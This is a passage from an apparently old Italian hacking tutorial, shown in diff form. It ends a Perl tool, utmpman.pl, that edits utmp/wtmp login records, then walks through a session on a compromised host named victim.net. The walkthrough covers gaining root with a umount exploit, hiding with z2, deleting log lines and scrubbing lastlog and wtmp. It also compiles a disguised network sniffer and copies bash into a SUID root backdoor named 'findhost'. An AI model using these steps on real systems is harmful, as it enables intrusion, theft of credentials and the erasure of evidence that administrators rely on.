+@shells = map( { /([^\/\n]+)\n*$/; $1; } @shells);
+                                 
+print push(@shells) . " valid shells in $shells_location: @shells\n" if 
+(defined(@shells));
+readfile("$utmp_location");
+print("\nutmpman: $active_file> ");
+while (<STDIN>) {
+  process_cmd(split);
+  print("\nutmpman: $active_file> ");
+}
+
+sub process_cmd {
+  return if (!defined(@_));
+  my(@line) = map { lc($_) } @_;
+  
+  $_ = shift(@line);
+  SWITCH: {
+        /^check$/     && do {
+                           check_func(@line);
+                           last SWITCH;
+                         };
+
+        /^delete$/    && do {
+                           del_func(@line);
+                           last SWITCH;
+                         };  
+                         
+        /^help$/      && do {
+                           help_func();
+                           last SWITCH;          
+                         };
+                                      
+        /^insert$/    && do {
+                           ins_func(@line);
+                           last SWITCH;
+                         }; 
+                                      
+        /^list$/      && do {
+                           list_func(@line);
+                           last SWITCH;
+                         };
+
+        /^read$/      && do {
+                           read_func(@line);
+                           last SWITCH;
+                         };
+                                                                                              
+        /^write$/     && do {
+                           write_func(@line);
+                           last SWITCH;
+                         };              
+                                                    
+        /^quit|exit$/ && exit(0);
+        
+        # DEFAULT. 
+        print ("Invalid command.\n");       
+  }
+}
+
+
+# HELP
+
+sub help_func {
+  print << "EOM";
+
+utmpManager Help
+----------------
+
+Note: - <n> is an argument.
+      - [id=] is a token which expects a value as part of command
+        (ie, insert id=p5 user=root 11/23/96). See the insert command.
+      - A line is the full name to the tty port, ie ttyp0.
+      - An id is the *unique* representation of the port
+        (without the tty, etc), ie "p0" (for ttyp0).
+
+  check
+    - Perform user consistancy check. Use this to make sure that the data in
+      utmp agrees with who is actually on the machine. This is useful in
+      determining if a user is online with hidden ports, running nohup'd
+      processes, or running iScreen.
+
+  delete <x>-<y>
+    - Delete entries #x to #y.
+
+  delete host <host>
+    - Delete *all* entries which match the substring <host>.
+
+  delete line|id <line|id>
+    - Delete entry containing <line> or <id>.
+
+  insert {id=|line=} [type=] [user=] [host=] [ConnTime] {LogoffTime}
+    - Insert an entry into utmp/wtmp files specifying any combination
+      of id/line, type, username, host, connection time, and logoff time.
+      (LogoffTime only valid for WTMP files.)
+
+  list host <host>
+    - List all entries matching the substring <host>.
+
+  list line|id <line|id>
+    - List all entries matching <line> or <id>.
+
+  read utmp|wtmp|<filename>
+    - Read entries from either default wtmp, default utmp, or an arbitrary
+      filename. Note: arbitrary filenames MUST start with either "utmp" or
+      "wtmp" to be used with this editor. Rename files *outside* of this
+      editor if necessary. If read is executed without any arguments, it
+      rereads the last given filename, which is displayed on the prompt.
+
+  write {filename}
+    - Write entries to file {filename}. If write is executed without any
+      arguments, then entries will be written to the last given filename,
+      which is displayed on the prompt.
+
+EOM
+}
+
+# DELETE
+
+sub del_func {
+  my(@params) = @_;
+
+  if (!push(@_)) {
+    print("delete :: Not enough parameters. See \"help\" for syntax.\n");
+    return undef;
+  } elsif ($params[0] =~ /host|user|id|line/) {
+    del_by_data(@_);
+  } elsif ($params[0] =~ m/\d*-\d+|\d+-\d*/) {
+    del_by_range($params[0]);
+  } elsif ($params[0] =~ m/^(\d+)$/) {
+    del_by_range("$1-$1");
+  }
+  
+  # Renumber list after delete operation.
+  resync();
+}
+
+
+sub del_by_range {
+  my($range)=shift;
+  $range =~ m/(\d+)*-(\d+)*/;
+  my($lo, $hi, $count)=($1, $2, 0);
+  
+  $lo = 0 if (!defined($lo));
+  $hi = scalar(keys(%entries)) if (!defined($hi));
+  
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if (($_ >= $lo) && ($_ <= $hi)) {
+      delete($entries{$_});
+      $count++;
+    }
+  }
+  print "$count entries deleted.\n";
+}               
+
+
+sub del_by_data {
+  my($op, $data) = @_;
+  my($count) = 0;
+
+  if ((length($data) < 5) && ($op eq "host")) {
+    print "Must specify at least 5 characters for delete hostmask.\n";
+    return undef;
+  } elsif (((length($data) > 4) && ($op eq "id"))||
+           ((length($data) > 11) && ($op eq "line"))) {
+    print "Invalid $op specified.\n";
+    return undef;
+  }
+  # Note: If we are deleting by user, then user must match, *exactly*!
+  $data = "^" . pack("a8", $data) . "\$" if ($op eq "user");
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if (%{$entries{$_}}->{$op} =~ m/$data/i) {
+      delete($entries{$_});
+      ++$count;
+    }
+  }
+  if (!$count) {
+    print "No $op entries matching $data.\n";
+  } else {
+    print "$count entries deleted.\n";
+  }
+}
+
+
+# INSERT
+
+# Date1 Time1 = DateTime1 => mm/dd/[cc]yy[:hh:mm[:ss]]
+# Date2 Time2 = DateTime2 => (see above)
+# user=<username>
+# host=<hostname>
+# id=<id> | line=<line>
+#
+# utmp:
+# insert {id=|line=} [type=] [user=] [host=] [DateTime]
+# wtmp:
+# insert {id=|line=} [user=] [host=] [DateTime1] {DateTime2}
+
+sub ins_func {
+  my(%cmdopt)={};
+  my($datetime1, $datetime2, $gmdate, $gmdate2);
+
+  # Get random pid out of the way.
+  $cmdopt{"pid"} = int(rand(32656)+100);
+  $cmdopt{"addr"} = pack("a4", "");
+
+  # Get command options.
+  foreach (@_) {
+    if (/=/) {
+      local($key, $value)=split(/=/);
+      $cmdopt{$key} = $value;
+    } else {
+      if (!defined($datetime1)) {
+        $datetime1 = $_;
+        next;
+      }
+      if (!defined($datetime2)) {
+        $datetime2 = $_ ;
+        next;
+      }
+      print "insert :: Invalid options specified. Please see \"help\" for 
+syntax.\n";
+      return undef;
+    }
+  }
+
+  # Check for an illegal pair or illegal option.
+  foreach (keys(%cmdopt)) {
+    if (!(/^host|id|line|type|user|addr$/)) {
+      print "insert :: Invalid options specified. Please see \"help\" for 
+syntax.\n";
+      return undef;
+    }
+    if (($_ eq "last") && ($active_file !~  m!/*utmp[^/]*$!i)) {
+      print "insert :: LAST option only valid for utmp files.\n";
+      return undef;
+    }     
+  }
+
+  # Get date in seconds since 1970.
+  $gmdate = SecsSince1970($datetime1);
+
+  # Get ending date in seconds since 1970.
+  $gmdate2 = SecsSince1970($datetime2) if (defined($datetime2));
+
+  if (!defined($gmdate) || (!defined($gmdate2) && defined($datetime2))) {
+    print "insert :: Invalid date specified.\n";
+    return undef;
+  }
+
+  if (defined($gmdate2)) {
+    if ($gmdate2 < $gmdate) {
+      print "insert :: First date/time must be *later* than second 
+date/time.\n";
+      return undef;
+    }
+  }
+
+  if (defined($cmdopt{"id"}) && defined($cmdopt{"line"})) {
+    print "insert :: Insert by LINE or ID only. Please do not specify both.\n";
+    return undef;
+  }
+
+  my($op);
+
+  if (!defined($cmdopt{"id"})) {
+    $cmdopt{"id"} = $cmdopt{"line"};
+    $op = "line";
+    if (!($cmdopt{"id"} =~ s/^$ttybase//)) { 
+      print "insert :: Invalid line specified.\n"; 
+      return undef; 
+    }
+  } else {
+    $cmdopt{"line"} = $ttybase . $cmdopt{"id"};
+    $op = "id";
+  } 
+
+  if (!(defined($cmdopt{"line"}) || defined($cmdopt{"id"}))) {
+    print "insert :: Neither LINE nor ID value found. See \"help\" for 
+syntax.\n";
+    return undef;
+  }
+    
+  my($searchdata) = ($active_file =~ m!/*utmp[^/]*$!i) ?  
+    (pack(($op eq "line") ? "a12" : "a4", $cmdopt{$op})):$cmdopt{$op};
+  my($epos1, $npos1, $epos2, $npos2) = ();
+  my($oldpos, $count)=("", 0);
+
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if ($active_file =~ m!/*utmp[^/]*$!i) {
+      # Handle utmp insertion by line insertion.
+      if (%{$entries{$_}}->{$op} eq $searchdata) {
+        printf ("insert :: $op $searchdata already exists at position $_\n");
+        # This needs to check every option in %cmdopt for defined or null.
+        $count = 0;
+        foreach (qw(user host time)) {
+          if (defined($cmdopt{$_})) {
+            $count++ if ($cmdopt{$_} ne "");
+          }
+        }
+        if (!$count) {
+          printf ("insert :: No other data specified. Entry unchanged.\n");
+          return undef;
+        }
+        last;
+      }
+    } else {
+      # Handle wtmp insertion by time position. (Messy)
+      $epos1 = $oldpos if (defined($npos1) && !defined($epos1));
+      $npos1 = $_ if (%{$entries{$_}}->{"time"} > $gmdate);
+      last if (!defined($gmdate2) && defined($epos1));
+      $epos2 = $oldpos if (defined($npos2)); 
+      $npos2 = $_ if (%{$entries{$_}}->{"time"} > $gmtime2);
+      last if (defined($epos2));
+    }
+    $oldpos = $_;
+  }
+
+  # Set any unspecified defaults.
+  $cmdopt{"user"} = pack("a8", "")  if !defined($cmdopt{"user"});
+  $cmdopt{"host"} = pack("a16", "") if !defined($cmdopt{"host"});
+  $cmdopt{"type"} = 7               if !defined($cmdopt{"type"});
+
+  # Determine end of list insertion positions. (IE, dates entered are after
+  # dates in wtmp file or line/id not found in utmp file.
+  $epos1 = (scalar(keys(%entries)) + 1) if (!defined($npos1));
+  if (defined($datetime2)) {
+    $epos2 = (scalar(keys(%entries)) + 1) if (!defined($npos2));
+    ++$epos2 if (defined($gmtime2) && !defined($npos1));
+  }
+
+  # Parse insert data and insert entry.
+  $epos1 = sprintf("%7.3f", ($npos1 - $epos1)/2) if (defined($npos1));
+  $epos2 = sprintf("%7.3f", ($npos2 - $epos2)/2)
+    if (defined($npos2) && defined($gmdate2));
+
+  # Insert first entry.
+  $cmdopt{"time"} = $gmdate;  
+  @{$entries{$epos1}}{qw(type pid line id time user host addr)} = 
+           @{%cmdopt}{qw(type pid line id time user host addr)};
+
+  if (defined($epos2)) {
+    $cmdopt{"user"} = pack("a8", "");
+    $cmdopt{"host"} = pack("a16","");
+    $cmdopt{"id"}   = pack("a4", "");
+    $cmdopt{"time"} = $gmdate2;
+ 
+    @{$entries{$epos2}}{qw(type pid line id time user host addr)} =
+             @{%cmdopt}{qw(type pid line id time user host addr)};
+  }
+
+  resync();
+}
+
+
+# LIST
+
+sub list_func {
+  my(@params) = @_;
+
+  if (!push(@_) || ($params[0] eq "all")) {
+    list_by_range("-");
+    return 0;
+  } elsif ($params[0] =~ /^host|user|id|line$/) {
+    list_by_data(@_);
+    return 0;
+  } elsif ($params[0] =~ m/\d*-\d+|\d+-\d*/) {
+    list_by_range($params[0]);
+    return 0;
+  } elsif ($params[0] =~ m/^(\d+)$/) {
+    list_by_range("$1-$1");
+    return 0;
+  }
+                          
+  print ("list :: Error in parameters. See \"help\" for syntax.\n");
+  return undef;
+}    
+
+
+sub list_by_data {
+  my($op, $data) = @_;
+  my($count) = 0;
+
+  foreach (sort( {$a <=> $b} keys(%entries))) {
+    if (%{$entries{$_}}->{$op} =~ m/$data/i) {
+      list_entry($_);
+      ++$count;
+    }
+  }
+  print "No $op entries matching $data.\n" if (!$count);
+}
+
+
+sub list_by_range {
+  my($range)=shift;
+  $range =~ m/(\d+)*-(\d+)*/;
+  my($lo, $hi)=($1, $2);
+  
+  $lo = 0 if (!defined($lo));
+  $hi = scalar(keys(%entries)) if (!defined($hi));
+  
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if (($_ >= $lo) && ($_ <= $hi)) {
+      list_entry($_);
+    }
+  }
+}               
+
+
+sub list_entry {
+  printf("#%3d - " . gmtime(%{$entries{$_}}->{"time"}), $_);
+  printf("  %s/%s", @{$entries{$_}}{qw(id line)});
+  printf(": %s ", %{$entries{$_}}->{"user"})
+    if (%{$entries{$_}}->{"user"} ne pack("a8", ""));
+  printf("from %s", %{$entries{$_}}->{"host"}) 
+    if (%{$entries{$_}}->{"host"} ne pack("a16", ""));
+  if (%{$entries{$_}}->{"addr"} ne "\0\0\0\0") {
+    printf(" (%s)", longtodot4(%{$entries{$_}}->{"addr"}));
+  }
+  print ("\n");
+  printf("%7sPID = %u\n", "", %{$entries{$_}}->{"pid"}) 
+    if (%{$entries{$_}}->{"pid"} && (%{$entries{$_}}->{"user"} ne 
+pack("a8","")));
+}
+
+# <Silmaril> printf "#$_ - %s %s/%s: %s from %s\n", @{$v}->{qw(time id line user 
+host)};
+# <Silmaril> now *that's* cool :-)
+# <Silmaril> should be like this: @{$v}{qw(time id line user host)}
+# <Silmaril> I had an extra -> in my first version.
+#
+# Or course, it's changed since then, but - "Thanks, Sil!" :)
+#
+
+
+# READ
+
+
+sub read_func {
+  my($arg)=shift;
+  
+  $arg = $utmp_location if ($arg eq "utmp");
+  $arg = $wtmp_location if ($arg eq "wtmp");
+  $arg = $active_file if (!defined($arg));
+  
+  if ($arg !~ m!/*[uw]tmp[^/]*$!) {
+    print("read :: Filenames *must* start with either 'wtmp' or 'utmp' to be 
+edited.\n");
+    return undef;
+  }
+  
+  readfile($arg);
+}
+   
+
+# WRITE
+
+sub write_func {
+  my($file)=shift;
+  my($count)=0;
+  
+  $file = $active_file if (!defined($file));
+  if ($file !~ m!/*[uw]tmp[^/]*$!) {
+    print ("write :: File must start with 'utmp' or 'wtmp'.\nRename file outside 
+this program.\n");
+    return undef;
+  }
+  if (!open(OUTFILE, ">$file")) {
+    print ("write :: Can't open $file for output.\n");
+    return undef;
+  }
+  binmode(OUTFILE);
+  
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    printf OUTFILE ("%s", pack("i L a12 a4 L a8 a16 a4", 
+      @{$entries{$_}}{qw(type pid line id time user host addr)}));
+    $count++;
+  }
+  print ("$active_file: " . scalar(keys(%entries)) . " entries written.\n");
+  close(OUTFILE);
+}               
+
+
+# CHECK
+
+sub check_func {
+  if (push(@_)) {
+    print "check :: Invalid options specified. Please see \"help\"\n";
+    return undef;
+  }
+  if ($active_file !~ m!/*utmp[^/]*$!) {
+    print "check :: Command can only be run on utmp files.\n";
+    return undef;
+  }
+  
+  # Build struct of ports containing port name, device num and owner.
+  # Note: Test run in grepstr may *not* be portable for all Unix
+  #       types. Be forewarned! This was designed for Linux.
+  # Hint: For all intents and purposes, s/^$ttybase([$ttyrange][$ttyports])$/
+  #       should return the same as what you expect in "struct utmp->ut_id".
+  my($grepstr) = "^($ttybase\[$ttyrange\]\[$ttyports\])\$";
+  my(%ports) = {};
+  my($user, $rdev) = ();
+
+  opendir(DEVDIR, "/dev");
+  my(@devfiles) = readdir(DEVDIR);
+  @devfiles = grep(/$grepstr/, @devfiles);  
+  close(DEVDIR);
+  foreach (@devfiles) {
+    /^$ttybase([$ttyrange][$ttyports])$/;
+    if (!defined($1)) {
+      print "check :: Warning! Could not extract port ID from $_.\n";
+    } else {
+      ($user, $rdev) = (stat("/dev/$_"))[4, 6];
+      $user = getpwuid($user);
+      $ports{$1} = newport($_, $rdev, $user);
+    } 
+  }
+  
+  # Check ownership of /dev ports.
+  my(@logdev)=();
+  foreach (sort(keys(%ports))) {
+    push(@logdev, $_) if (%{$ports{$_}}->{"owner"} ne "root");
+  }
+  @logdev = sort(@logdev);
+      
+  # Check utmp (against ports detected as logged in);
+  my(@logutmp)=();
+  foreach (sort( { $a <=> $b } keys(%entries))) {
+    if (defined(%{$entries{$_}}->{"user"}) && defined(%{$entries{$_}}->{"host"}) 
+&&
+        defined(%{$entries{$_}}->{"id"})   && defined(%{$entries{$_}}->{"pid"})) 
+{
+      push(@logutmp, %{$entries{$_}}->{"id"})  
+        if ((%{$entries{$_}}->{"id"} =~ /[$ttyrange][$ttyports]/) &&
+            ((%{$entries{$_}}->{"user"} ne pack("a8", "")) ||
+            ((%{$entries{$_}}->{"host"} ne pack("a16", "")) &&
+             (%{$entries{$_}}->{"id"} ne pack("a4", "")) &&
+             (%{$entries{$_}}->{"line"} ne pack("a12", "")) &&
+             (%{$entries{$_}}->{"pid"} > 0))));
+    }
+  }
+  @logutmp = sort(@logutmp);
+
+  # Check PIDs (find processes with active port ids)
+  opendir(PIDDIR, "/proc");
+  my(%processes) = {};
+  my(@portprocesses) = ();
+  foreach (grep(/\d+/, readdir(PIDDIR))) {
+    local($procdata, $cmdline);
+    open(PROCFILE, "</proc/$_/stat");
+    $procdata = <PROCFILE>;
+    close(PROCFILE);
+    if (-e "/proc/$_/stat") {
+      local($cmdline, $devnum, $portid);
+      ($cmd, $devnum) = (split(/ /, $procdata))[1, 6];
+      # Remove surrouding () from command name.
+      $cmd =~ s/[\(\)]//g;
+      $portid = dev2id(\%ports, $devnum);
+      if (defined($portid)) {
+        push(@portprocesses, $portid)
+          if (!defined(listpos(\@portprocesses, $portid))&&($$ != $_));
+        $processes{$_} = newproc($cmd, $portid) if (defined($portid) && ($$ != 
+$_));
+      }
+    }
+  }
+  close(PIDDIR);
+
+  # A port is *not* logged in if there is no dev entry for port, no utmp entry
+  # and no active processes.
+  my(@validshellports) = ();
+  foreach (sort( { $a <=> $b} keys(%processes))) {
+    push(@validshellports, %{$processes{$_}}->{"port"}) 
+      if (defined(listpos(\@shells, %{$processes{$_}}->{"cmd"}))&&
+          !defined(listpos(\@validshellports, %{$processes{$_}}->{"port"})));
+  }
+  # Remove ports with valid shells from list of ports with active processes.
+  my(@noshellports) = 
+    sort(grep(!defined(listpos(\@validshellports, $_)), @portprocesses));
+  @validshellports = sort(@validshellports);
+  print "Ports with active /dev files: @logdev\n"
+    if (defined(@logdev));
+  print "Ports with utmp entries: @logutmp\n"
+    if (defined(@logutmp));
+  print "Ports with valid shells: @validshellports\n" 
+    if (defined(@validshellports));
+  print "Ports with active processes and *no* shells: @noshellports\n" 
+    if (defined(@noshellports));
+}  
+  
+    
+# GENERAL
+
+sub readfile {
+  local($file);
+  $file = shift;
+  my($index)=1;
+  my($buffer)="";
+
+  # Insure we have a clean hash table before we start reading in the file.
+  foreach (keys(%entries)) {
+    undef(%{$entries{$_}});
+    delete(${entries{$_}});
+  }
+    
+  open(UTMPFILE, "<$file") || die("utmp-parse: Can't open $file - $!\n");
+  binmode(UTMPFILE);
+  # 1/17/96, struct utmp is 56 bytes (54 according to addition! :P).  
+  while (read(UTMPFILE, $buffer, 56)) {
+    $entries{$index++} = newutmp($buffer);
+  }
+  $active_file = $file;
+  print ("$active_file: " . scalar(keys(%entries)) . " entries loaded.\n");
+  close(UTMPFILE);
+}
+
+
+sub newutmp {
+  my($newbuff) = shift;
+  my($longaddr) = 0;
+  
+  $newnode = bless { 
+    "type" => undef, "pid" => undef,  "line" => undef, "id"   => undef,
+    "time" => undef, "user" => undef, "host" => undef, "addr" => undef
+  }, 'UTMPNODE';
+  
+  @{$newnode}{qw(type pid line id time user host addr)}=
+    unpack("i L a12 a4 L a8 a16 a4", $newbuff);
+                             
+  return $newnode;
+}  
+
+
+sub newport {
+ 
+  $newnode = bless {
+    "port" => undef, "rdev" => undef, "owner" => undef, "cmd" => undef,
+  }, 'PORTNODE';
+  
+  @{$newnode}{qw(port rdev owner)} = @_;
+  
+  return $newnode;
+}
+
+
+sub newproc {
+ 
+  $newnode = bless {
+    "cmd" => undef, "port" => undef, 
+  }, 'PROCNODE';
+  
+  @{$newnode}{qw(cmd port)} = @_;
+  
+  return $newnode;
+}
+
+
+# Renumber hashes to default order.
+sub resync {
+  my(%newhash) = ();
+  my($count)=0;
+
+  # Write ordered list in to temporary hash, deleting as we go.
+  foreach (sort( {$a <=> $b} keys(%entries))) {
+    $newhash{++$count} = $entries{$_};
+    delete($entries{$_});
+  }
+
+  # Copy elements back in to original hash table.
+  foreach (sort( {$a <=> $b} keys(%newhash))) {
+    $entries{$_} = $newhash{$_};
+  }
+}
+
+
+sub longtodot4 {
+  my($addr)=shift;
+
+  return join(".", map( ord($_), split(//, $addr)));
+}
+
+sub dev2id {
+  my($portlist, $rdev) = @_;
+
+  foreach (sort(keys(%{$portlist}))) {
+    return $_ if (%{$portlist}->{$_}->{"rdev"}==$rdev);
+  }                               
+  return undef;
+}
+
+
+sub listpos {
+  my($arrayref, $search) = @_;
+  my($count) = 0;
+
+$^W = 0;
+  foreach (@{$arrayref}) {
+    return $count if ($search eq ${$arrayref}[$count]);
+    $count++;
+  }
+$^W = 1;
+
+  return undef;
+}
+
+
+### DATE ROUTINES
+
+# The following code taken & modified from the Date::Manip package.
+# Here is his copyright:
+#
+## Copyright (c) 1995,1996 Sullivan Beck. All rights reserved.
+## This program is free software; you can redistribute it and/or modify it
+## under the same terms as Perl itself.
+
+
+sub SecsSince1970 {
+# Parse as mm/dd/[cc]yy[:hh:mm[:ss]]
+  my($datetime) = shift;
+  my($m,$d,$y,$h,$mn,$s) = ();
+
+  # If date is not defined, then return local current date and time.
+  return time() if (!defined($datetime));
+
+  $datetime =~ 
+    s!^(\d{1,2})/(\d{1,2})/(\d{4}|\d{2})(?:\:(\d{2}):(\d{2})(?:\:(\d{2}))?)?!!;
+  ($m, $d, $y, $h, $mn, $s) = ($1, $2, $3, $4, $5, $6);
+  $m--;
+
+  # Finalize time components and check them.
+  $y = (($y < 70) ? "20":"19" . $y) if (length($y)==2); 
+
+  # This checks for any *non-matched* portion of $datetime. If there is such
+  # an animal, then there is illegal data specified. Also screens for undefined
+  # components which HAVE to be in ANY valid date/time (ie, month, day, year).
+  return undef if (!defined($m) || !defined($d) || !defined($y) || 
+length($datetime));
+
+  # Set time components with unspecified values.
+  $s = 0 if (!defined($s));
+  $mn = 0 if (!defined($mn));
+  $h = 0 if (!defined($h));
+
+  # Check for ranges.
+  return undef if (($m > 11)    || ($h > 23)    || ($mn > 59)   || ($s > 59));
+                     
+  # Begin conversion to seconds since 1/1/70.
+  my($sec_now,$sec_70)=();
+  $sec_now=DaysSince999($m,$d,$y);
+  return undef if (!defined($sec_now));
+
+  $sec_now--;
+  $sec_now = $sec_now*24*3600 + $h*3600 + $mn*60 + $s;
+  $sec_70 =30610224000;
+  return ($sec_now-$sec_70);
+}
+
+
+sub DaysSince999 {
+  my($m,$d,$y)=@_;
+  my($Ny,$N4,$N100,$N400,$dayofyear,$days)=();
+  my($cc,$yy)=();
+
+  $y=~ /^(\d{2})(\d{2})$/;
+  ($cc,$yy)=($1,$2);
+
+  # Number of full years since Dec 31, 0999
+  $Ny=$y-1000;
+
+  # Number of full 4th years (incl. 1000) since Dec 31, 0999
+  $N4=int(($Ny-1)/4)+1;
+  $N4=0         if ($y==1000);
+
+  # Number of full 100th years (incl. 1000)
+  $N100=$cc-9;
+  $N100--       if ($yy==0);
+
+  # Number of full 400th years
+  $N400=int(($N100+1)/4);
+
+  # Check to insure that information returns a valid day of year.
+  $dayofyear=dayofyear($m,$d,$y);
+  return undef if (!defined($dayofyear));
+
+  # Compute day of year.
+  $days= $Ny*365 + $N4 - $N100 + $N400 + $dayofyear;
+
+  return $days;
+}
+
+
+sub dayofyear {
+  my($m,$d,$y)=@_;
+  my(@daysinmonth)=(31,28,31,30,31,30,31,31,30,31,30,31);
+  my($daynum,$i)=();
+  $daysinmonth[1]=29  if (!($y % 4));
+
+  # Return error if we are given an invalid date.
+  return undef if ($d > $daysinmonth[$m]);
+
+  $daynum=0;
+  for ($i=1; $i<$m; $i++) {
+    $daynum += $daysinmonth[$i];
+  }
+  $daynum += $d;
+  
+  return $daynum;
+}
+
+
+## END DATE ROUTINES.
+      
+# End of script.
+
+0;
+
+--------------------- end of utmpman.pl
+
+
+----------------------
+Capitolo VI
+Eliminare i file log
+----------------------
+
+------------------------------
+Sezione 6A
+Un giro in un sistema hackato
+------------------------------
+
+Non finiremo mai di dirtelo! Pulisci, Pulisci!!! In questa sezione ti porteremo 
+in un sistema e ti mostreremo alcune basi su come cercare e come eliminare la
+tua presenza dal sistema. Per iniziare loggiamoci in un sistema:
+
+****** --> guarda chi c'e' nella macchina
+[/home/master]finger @victim.net
+[victim.net]
+No one logged on.
+
+****** --> Ok non c'e' nessuno, possiamo loggarci
+[/home/master]telnet victim.net
+
+Trying xxx.206.xx.140...
+Connected to victim.net.
+Escape character is '^]'.
+
+Welcome to Victim Research Linux (http://www.victim.net) Red Hat 2.1
+Kernel 1.2.13 on a i586
+
+
+ns.victim.net login: jnsmith
+Password:
+Linux 1.2.13.
+You have new mail.
+
+******---> Non leggere la sua mail, puoi vederle tutte in /var/spool/mail
+           e in ogni directory /home/username/mail dell'utente 
+
+******---> Controlla ancora se c'e' qualcuno
+
+[jnsmith@ns jnsmith]$ w
+
+5:36am  up 18 days,  8:23,  1 user,  load average: 0.01, 0.00, 0.00
+User     tty       login@  idle   JCPU   PCPU  what
+jnsmith   ttyp1     5:35am                      w
+
+******---> Solo noi ok.
+
+[jnsmith@ns jnsmith]$ cd .term
+
+******---> bel posto dove nascondere i nostri stuff ;)
+
+[jnsmith@ns .term]$ ./.u
+
+******---->usiamo umounc.c exploit
+
+******---> Adesso siamo root, usiamo z2 per diventare invisibili
+
+bash# z2 jnsmith
+Zap2!
+
+******----> Vediamo se ci siamo ancora...
+bash# w
+5:37am  up 18 days,  8:24,  0 users,  load average: 0.08, 0.02, 0.01
+User     tty       login@  idle   JCPU   PCPU  what
+
+******---->Hmm. adesso non c'e' nessuno nel sistema, devo essermi scollegato :)
+
+******---->Sappiamo che siamo root ma assicuriamoci...
+
+bash# whoami
+root
+bash#
+
+******----> Yup, root... In che directory siamo?
+
+bash# pwd
+/home/jnsmith/.term
+
+******----> Controlliamo i log
+bash# cd /var/log
+
+******----> il piu' delle volte in /var/adm, in quasto box /var/log
+
+bash# grep dormroom *
+maillog:Jan 29 05:31:58 ns in.telnetd[22072]: connect from 
+dormroom.playhouse.com
+maillog:Jan 29 05:35:29 ns in.telnetd[22099]: connect from 
+dormroom.playhouse.com
+
+******---->Yup, z2 si preoccupa di tutto ma questi maillog ...
+
+bash# pico maillog
+
+******---->in pico ho fatto un ctrl w, ho cercato dormroom quindi ctrl k per
+           cancellare le linee
+******----> Queste sono le linee cancellate
+
+Jan 29 05:31:58 ns in.telnetd[22072]: connect from dormroom.playhouse.com
+Jan 29 05:35:29 ns in.telnetd[22099]: connect from dormroom.playhouse.com
+
+bash# grep dormroom *
+
+******----> Yup, tutto cancellato ;)
+
+bash# w
+5:41am  up 18 days,  8:27,  0 users,  load average: 0.00, 0.00, 0.00
+User     tty       login@  idle   JCPU   PCPU  what
+
+******----> Yup, ho cancellato tutto anche qui ;)
+
+******----> Adesso ti mostro come usare lled e wted se il grep avesse
+            mostrato qualcosa in questi file
+
+bash# cd ~jnsmith/.term
+bash# lled
+bash# lled -c dormroom.playhouse
+Entries stored: 527 Entries removed: 0
+
+Adesso chmod lastlog.tmp e copialo sopra l'originale /var/log/lastlog
+
+******----> Niente in lastlog
+
+bash#
+bash# wted -e jnsmith
+Entries stored: 254 Entries removed: 0
+
+Adesso chmod wtmp.tmp e copialo sopra l'originale /var/log/wtmp
+
+******-----> Niente in wtmp
+
+******-----> Facciamo un po' di sniffing
+
+bash# pico linsniffer.c
+
+******-----> Ho cambiato queste linee per dirgli dove voglio far andare i log:
+
+#define TCPLOG "/tmp/.pinetemp.000"
+
+******-----> guardiamo cosa sta girando su questa macchina per pensare ad un
+ 	     nome che possa apparire simile a quelli qui sotto:
+
+bash# ps -aux
+
+root       143  0.0  0.0   84    0  ?  SW  Jan 10   0:01 (lpd)
+root       154  0.0  0.0  118    0  ?  SW  Jan 10   0:00 (smbd)
+root       163  0.0  0.5   76  176  ?  S   Jan 10   0:00 nmbd -D
+root       197  0.0  0.0   76    0 v03 SW  Jan 10   0:00 (getty)
+root       198  0.0  0.0   76    0 v04 SW  Jan 10   0:00 (getty)
+root       199  0.0  0.0   76    0 v05 SW  Jan 10   0:00 (getty)
+root       200  0.0  0.0   76    0 v06 SW  Jan 10   0:00 (getty)
+root       201  0.0  0.0   88    0 s00 SW  Jan 10   0:00 (uugetty)
+root       209  0.0  0.2   35   76  ?  S   Jan 10   0:01 (update)
+root       210  0.0  0.3   35  124  ?  S   Jan 10   0:03 update (bdflush)
+root     10709  0.0  1.4  152  452  ?  S   Jan 27   0:10 httpd
+root     11111  0.0  1.4  152  452  ?  S   Jan 27   0:07 httpd
+root     14153  0.0  0.8   70  268  ?  S   Jan 16   0:03 ./inetd
+root     14307  0.0  4.7 1142 1484  ?  S   Jan 16   1:16 ./named
+root     14365  0.0  0.0   76    0 v02 SW  Jan 16   0:00 (getty)
+root     17367  0.0  1.4  152  452  ?  S    11:01   0:02 httpd
+
+******-----> compiliamolo e chiamiamolo nmb
+
+bash# gcc linsniffer.c -o nmb
+
+******----> carichiamolo ...
+
+bash# nmb&
+[1] 22171
+
+******----> controlliamo il log file in /tmp
+
+bash#
+bash# cd /tmp
+bash# ls -al .pin*
+total 15691
+-rw-rw-r--   1 root     jnsmith          0 Jan 29 05:50 .pinetemp.000
+
+******----> c'e' ma non vogliamo che appaia la nostra login
+
+bash# chgrp root .pin*
+
+******----> vediamo adesso...
+
+bash# ls -al .pin*
+-rw-rw-r--   1 root     root            0 Jan 29 05:50 .pinttemp.000
+bash#
+
+******----> cosi' va meglio, creiamo una SUID shell in modo da non rifare
+            questo casino ancora.(controlla MD5 o altri prg nel cron)
+
+bash# cd /bin
+bash# ls -l sh
+lrwxrwxrwx   1 root     root            4 Mar  1  1996 sh -> bash
+
+******----> questo e' un sym link
+bash# ls -l bash
+-rwxr-xr-x   1 root     root       299296 Nov  2  1995 bash
+
+******----> questo e' un file reale ... vediamo come chiamarlo in modo che
+            sembri uno di questi
+bash# ls
+arch           df             ksh            ping           tar
+ash            dmesg          ln             ps             tcsh
+bash           dnsdomainname  login          pwd            true
+cat            domainname     ls             red            ttysnoops
+chgrp          echo           mail           rm             umount
+chmod          ed             mkdir          rmdir          uname
+chown          false          mknod          sed            vi
+cp             findterm       more           setserial      view
+cpio           gunzip         mount          sh             vim
+csh            gzip           mt             stty           zcat
+date           hostname       mv             su             zsh
+dd             kill           netstat        sync
+
+******----> Lo chiameremo findhost
+
+bash# cp bash findhost
+
+******----> ok, adesso andiamo a dare un'occhiata al nostro nuovo comando unix
+
+bash# ls -l findhost
+-rwxr-xr-x   1 root     jnsmith     299296 Jan 29 05:59 findhost
+
+******----> Dobbiamo cambiare il proprietario del gruppo, cambiare la data e
+             farlo SUID
+
+bash# chgrp root findhost
+bash# ls -l findhost
+-rwxr-xr-x   1 root     root       299296 Jan 29 05:59 findhost
+
+bash# chmod +s findhost
